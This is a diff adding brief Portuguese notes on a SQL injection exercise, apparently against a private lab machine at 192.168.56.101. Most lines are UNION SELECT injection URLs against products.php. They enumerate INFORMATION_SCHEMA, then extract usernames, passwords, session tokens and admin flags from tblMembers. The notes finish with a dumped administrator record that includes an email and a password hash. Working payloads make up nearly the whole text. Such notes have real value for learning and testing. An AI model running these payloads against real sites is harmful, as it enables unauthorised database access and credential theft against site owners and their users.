@@ -1,0 +1,23 @@
+TABLE_SCHEMA, COLUMN_NAME, TABLE_NAME
+
+http://192.168.56.101/products.php?type=2 union select 1, 2, TABLE_NAME, 4, 5 from INFORMATION_SCHEMA.COLUMNS
+
+O 'name:' é o único campo que retorna informacão útil e está na 3a coluna (se se quiser ver nas outras colunas tem que se inspecionar a página)
+
+http://192.168.56.101/products.php?type=2 union select 1, 2, COLUMN_NAME, 4, 5 from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = "tblBlogs"
+
+http://192.168.56.101/products.php?type=2 union select 1, 2, id, 4, 5 from tblMembers
+http://192.168.56.101/products.php?type=2 union select 1, 2, username, 4, 5 from tblMembers
+http://192.168.56.101/products.php?type=2 union select 1, 2, password, 4, 5 from tblMembers
+http://192.168.56.101/products.php?type=2 union select 1, 2, session, 4, 5 from tblMembers
+http://192.168.56.101/products.php?type=2 union select 1, 2, name, 4, 5 from tblMembers
+http://192.168.56.101/products.php?type=2 union select 1, 2, blog, 4, 5 from tblMembers
+http://192.168.56.101/products.php?type=2 union select 1, 2, admin, 4, 5 from tblMembers
+
+Tabelas importantes:
+tblBlogs (author, title, content)
+tblMembers (id, username, password, session, name, blog, admin)
+tblProducts (id, type, name, price, detail)
+
+conteúdo da tabela tblMembers:
+1	admin@integratingsolutions.net	Administrator	354403ec41ad649d1e5a9f108f0e5245	Admin	1	1
